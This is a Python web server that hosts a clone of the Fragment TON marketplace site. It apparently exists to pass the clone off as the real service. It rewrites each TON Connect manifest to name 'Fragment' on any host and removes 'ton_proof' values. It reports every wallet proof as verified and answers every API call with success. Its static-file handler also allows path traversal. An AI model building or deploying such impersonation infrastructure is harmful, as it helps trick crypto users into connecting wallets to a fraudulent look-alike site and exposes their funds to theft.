import http.server
import os
import re
import json
import urllib.parse

VERSION = 598

PAGE_ROUTES = {
    "/": "index.html",
    "/numbers": "html/page_2.html",
    "/gifts": "html/page_3.html",
    "/stars": "html/page_4.html",
    "/premium": "html/page_5.html",
    "/ads": "html/page_6.html",
    "/html/numbers.html": "html/page_2.html",
    "/html/gifts.html": "html/page_3.html",
    "/html/stars.html": "html/page_4.html",
    "/html/premium.html": "html/page_5.html",
    "/html/ads.html": "html/page_6.html",
    "/html/about.html": "html/page_7.html",
    "/html/terms.html": "html/page_8.html",
    "/html/privacy.html": "html/page_9.html",
    "/html/ccccc.html": "html/page_17.html",
    "/html/president.html": "html/page_18.html",
    "/about": "html/page_7.html",
    "/terms": "html/page_8.html",
    "/privacy": "html/page_9.html",
    "/stars/buy": "html/page_4.html",
    "/stars/giveaway": "html/page_4.html",
}

SORT_FILTER_PAGES = {
    ("price", "auction"):      "html/page_10.html",
    ("price_desc", "auction"): "html/page_10.html",
    ("price", "sold"):         "html/page_11.html",
    ("price_desc", "sold"):    "html/page_11.html",
    ("price", "sale"):         "html/page_12.html",
    ("price_desc", "sale"):    "html/page_12.html",
    ("price_desc", ""):        "html/page_13.html",
    ("price_asc", ""):         "html/page_14.html",
    ("price_asc", "auction"):  "html/page_14.html",
    ("price_asc", "sold"):     "html/page_14.html",
    ("price_asc", "sale"):     "html/page_14.html",
    ("listed", ""):            "html/page_15.html",
    ("listed", "auction"):     "html/page_15.html",
    ("listed", "sold"):        "html/page_15.html",
    ("listed", "sale"):        "html/page_15.html",
    ("ending", ""):            "html/page_16.html",
    ("ending", "auction"):     "html/page_16.html",
    ("ending", "sold"):        "html/page_16.html",
    ("ending", "sale"):        "html/page_16.html",
}

MIME_TYPES = {
    ".html": "text/html; charset=utf-8",
    ".css":  "text/css",
    ".js":   "application/javascript",
    ".jpg":  "image/jpeg",
    ".jpeg": "image/jpeg",
    ".png":  "image/png",
    ".webp": "image/webp",
    ".ico":  "image/x-icon",
    ".svg":  "image/svg+xml",
    ".woff": "font/woff",
    ".woff2":"font/woff2",
    ".ttf":  "font/ttf",
    ".zip":  "application/zip",
    ".json": "application/json",
    ".gif":  "image/gif",
    ".mp4":  "video/mp4",
    ".txt":  "text/plain",
}

_page_cache = {}


def extract_aj_content(content):
    """Extract the innerHTML of #aj_content div."""
    start_marker = 'id="aj_content"'
    start_idx = content.find(start_marker)
    if start_idx == -1:
        start_marker = "id='aj_content'"
        start_idx = content.find(start_marker)
    if start_idx == -1:
        return ""

    div_open_end = content.find(">", start_idx) + 1
    depth = 1
    pos = div_open_end
    while depth > 0 and pos < len(content):
        next_open = content.find("<div", pos)
        next_close = content.find("</div>", pos)
        if next_close == -1:
            break
        if next_open != -1 and next_open < next_close:
            depth += 1
            pos = next_open + 4
        else:
            depth -= 1
            if depth == 0:
                return content[div_open_end:next_close]
            pos = next_close + 6
    return ""


def extract_aj_script(content):
    """Extract content of <script id="aj_script"> block."""
    m = re.search(r'<script[^>]+id=["\']aj_script["\'][^>]*>(.*?)</script>',
                  content, re.DOTALL)
    if m:
        script = m.group(1)
        # Remove the old ton_proof so wallet stays connected
        script = re.sub(
            r'"ton_proof"\s*:\s*"[^"]*"',
            '"ton_proof":""',
            script
        )
        return script.strip()
    return ""


def strip_scripts_from_html(html):
    """Remove all <script> tags from HTML (both inline and external)."""
    # Remove external scripts: <script src="..."></script>
    html = re.sub(r'<script[^>]+src=[^>]+>\s*</script>', '', html, flags=re.DOTALL)
    # Remove script blocks that contain ajInit(...) — these cause re-init
    html = re.sub(r'<script(?![^>]+id=["\']aj_script["\'])[^>]*>\s*ajInit\s*\(.*?\)\s*;?\s*</script>',
                  '', html, flags=re.DOTALL)
    # Remove <script id="aj_script">...</script> — will be sent as j field
    html = re.sub(r'<script[^>]+id=["\']aj_script["\'][^>]*>.*?</script>',
                  '', html, flags=re.DOTALL)
    # Remove any remaining inline scripts that contain ajInit
    html = re.sub(r'<script[^>]*>(?:[^<]|<(?!/script))*ajInit\s*\((?:[^<]|<(?!/script))*</script>',
                  '', html, flags=re.DOTALL)
    # Remove Cloudflare beacon scripts
    html = re.sub(r'<script[^>]+data-cf-beacon[^>]*>.*?</script>', '', html, flags=re.DOTALL)
    # Remove tc-widget-root (TON Connect widget — already on main page)
    html = re.sub(r'<div[^>]+id=["\']tc-widget-root["\'][^>]*>.*?</div>', '', html, flags=re.DOTALL)
    return html


def extract_search_html(content):
    """Extract .js-search-results section."""
    sr_marker = 'class="tm-section clearfix js-search-results"'
    sr_idx = content.find(sr_marker)
    if sr_idx == -1:
        sr_marker = "js-search-results"
        sr_idx = content.find(sr_marker)
    if sr_idx == -1:
        return ""

    sec_start = content.rfind("<", 0, sr_idx)
    sec_open_end = content.find(">", sec_start) + 1
    depth = 1
    pos = sec_open_end
    tag_name = "section"
    while depth > 0 and pos < len(content):
        next_open = content.find(f"<{tag_name}", pos)
        next_close = content.find(f"</{tag_name}>", pos)
        if next_close == -1:
            break
        if next_open != -1 and next_open < next_close:
            depth += 1
            pos = next_open + len(tag_name) + 1
        else:
            depth -= 1
            if depth == 0:
                return content[sec_start:next_close + len(tag_name) + 3]
            pos = next_close + len(tag_name) + 3
    return ""


def parse_page(filepath):
    if filepath in _page_cache:
        return _page_cache[filepath]

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    title_match = re.search(r"<title[^>]*>\s*(.*?)\s*</title>", content, re.DOTALL)
    title = title_match.group(1).strip() if title_match else "Fragment"

    rc_match = re.search(r'<html[^>]*class=["\']([^"\']*)["\']', content)
    rc = rc_match.group(1) if rc_match else ""

    raw_aj_html = extract_aj_content(content)
    aj_script = extract_aj_script(content)
    aj_html = strip_scripts_from_html(raw_aj_html)
    search_html = extract_search_html(content)

    result = {
        "title": title,
        "rc": rc,
        "aj_html": aj_html,
        "aj_script": aj_script,
        "search_html": search_html,
    }
    _page_cache[filepath] = result
    return result


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def send_full_page(self, file_path):
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        # Fix ton_proof in full page loads too
        content = re.sub(r'"ton_proof"\s*:\s*"[^"]*"', '"ton_proof":""', content)
        if "<base " not in content:
            content = content.replace("<head>", '<head>\n  <base href="/">', 1)
            if '<base href="/">' not in content:
                content = re.sub(r'(<head[^>]*>)', r'\1\n  <base href="/">', content, count=1)
        data = content.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def send_json(self, obj):
        data = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def send_empty_ok(self, mime="image/png"):
        # Minimal 1x1 transparent PNG
        png_1x1 = (
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01'
            b'\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
            b'\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01'
            b'\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
        )
        self.send_response(200)
        self.send_header("Content-Type", mime)
        self.send_header("Content-Length", str(len(png_1x1)))
        self.send_header("Cache-Control", "public, max-age=86400")
        self.end_headers()
        self.wfile.write(png_1x1)

    def build_ajax_response(self, file_path):
        page = parse_page(file_path)
        resp = {
            "v": VERSION,
            "h": page["aj_html"],
            "t": page["title"],
            "rc": page["rc"],
        }
        if page["aj_script"]:
            resp["j"] = page["aj_script"]
        return resp

    def do_GET(self):
        raw_path = self.path.split("?")[0]
        path = raw_path
        is_ajax = bool(self.headers.get("X-Aj-Referer"))

        # tonconnect manifest — serve with dynamic URL matching the real host
        if path == "/tonconnect-manifest.json":
            host = self.headers.get("Host", "")
            scheme = "https" if host and not host.startswith("localhost") else "http"
            origin = f"{scheme}://{host}" if host else "http://localhost:5000"
            manifest = {
                "url": origin,
                "name": "Fragment",
                "iconUrl": f"{origin}/img/fragment_icon.svg",
                "termsOfUseUrl": f"{origin}/terms",
                "privacyPolicyUrl": f"{origin}/privacy"
            }
            data = json.dumps(manifest, ensure_ascii=False).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(data)
            return

        path_ext = os.path.splitext(path)[1].lower()

        # Static files that exist on disk (CSS, JS, images, fonts…)
        static_path = path.lstrip("/")
        if static_path and os.path.isfile(static_path):
            mime = MIME_TYPES.get(path_ext, "application/octet-stream")
            with open(static_path, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", mime)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        # Named page routes
        file_path = PAGE_ROUTES.get(path)

        # Any /html/*.html not explicitly mapped → generic product page
        if file_path is None and path.startswith("/html/") and path.endswith(".html"):
            file_path = "html/page_17.html"

        # /number/* → number product page
        if file_path is None and path.startswith("/number/"):
            file_path = "html/page_number.html" if os.path.isfile("html/page_number.html") else "html/page_17.html"

        # /gifts/collection → gifts listing filtered by collection
        if file_path is None and re.match(r'^/gifts/[^/]+$', path):
            file_path = "html/page_3.html"

        # /gift/item or /gifts/collection/item → gift product page
        if file_path is None and (re.match(r'^/gift/', path) or re.match(r'^/gifts/[^/]+/.+', path)):
            file_path = "html/page_gift.html" if os.path.isfile("html/page_gift.html") else "html/page_17.html"

        # /username slugs → username product page
        if file_path is None and re.match(r'^/[a-zA-Z0-9_]+$', path):
            slug = path.lstrip("/")
            candidate = f"html/{slug}.html"
            file_path = candidate if os.path.isfile(candidate) else "html/page_17.html"

        if file_path:
            if is_ajax:
                try:
                    self.send_json(self.build_ajax_response(file_path))
                except Exception:
                    self.send_full_page(file_path)
            else:
                self.send_full_page(file_path)
            return

        # Missing images / icons → return 1×1 transparent PNG (no 404)
        img_exts = {".ico", ".svg", ".png", ".jpg", ".jpeg", ".gif", ".webp"}
        if path_ext in img_exts:
            self.send_empty_ok(MIME_TYPES.get(path_ext, "image/png"))
            return

        # Missing fonts → empty 200
        font_exts = {".woff", ".woff2", ".ttf"}
        if path_ext in font_exts:
            self.send_response(200)
            self.send_header("Content-Type", MIME_TYPES.get(path_ext, "font/woff2"))
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        # Catch-all: never show a 404 page
        if is_ajax:
            try:
                self.send_json(self.build_ajax_response("index.html"))
            except Exception:
                self.send_full_page("index.html")
        else:
            self.send_full_page("index.html")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Aj-Referer")
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        params = urllib.parse.parse_qs(body)
        method = params.get("method", [""])[0]

        if method == "searchAuctions":
            sort_val   = params.get("sort",   ["price_desc"])[0]
            filter_val = params.get("filter", [""])[0]

            # Detect section from Referer header so gifts/numbers stay in their section
            referer = self.headers.get("Referer", "") or self.headers.get("X-Aj-Referer", "")
            referer_path = urllib.parse.urlparse(referer).path if referer else "/"

            parts = []
            if sort_val:
                parts.append(f"sort={sort_val}")
            if filter_val:
                parts.append(f"filter={filter_val}")
            qs = ("?" + "&".join(parts)) if parts else ""

            if referer_path.startswith("/gifts"):
                page_file = "html/page_3.html"
                url = "/gifts" + qs
            elif referer_path.startswith("/numbers"):
                page_file = "html/page_2.html"
                url = "/numbers" + qs
            else:
                page_file = SORT_FILTER_PAGES.get((sort_val, filter_val))
                if not page_file:
                    page_file = SORT_FILTER_PAGES.get((sort_val, "auction"))
                if not page_file:
                    page_file = "html/page_13.html"
                url = "/" + qs

            try:
                page = parse_page(page_file)
                self.send_json({
                    "ok": 1,
                    "html": page["search_html"],
                    "url": url,
                    "expire": 9999999999,
                })
            except Exception as e:
                self.send_json({"ok": 0, "error": str(e)})
            return

        # TON wallet — accept connection, mark as verified
        if method == "checkTonProofAuth":
            self.send_json({"ok": 1, "verified": True})
            return

        if method == "checkWallet":
            self.send_json({"ok": 1})
            return

        if method == "tonLogOut":
            self.send_json({"ok": 1})
            return

        # All other API calls — return ok so no JS errors appear
        self.send_json({"ok": 1})


class ReusableHTTPServer(http.server.HTTPServer):
    allow_reuse_address = True

if __name__ == "__main__":
    server = ReusableHTTPServer(("0.0.0.0", 5000), Handler)
    print("Server running on port 5000")
    server.serve_forever()
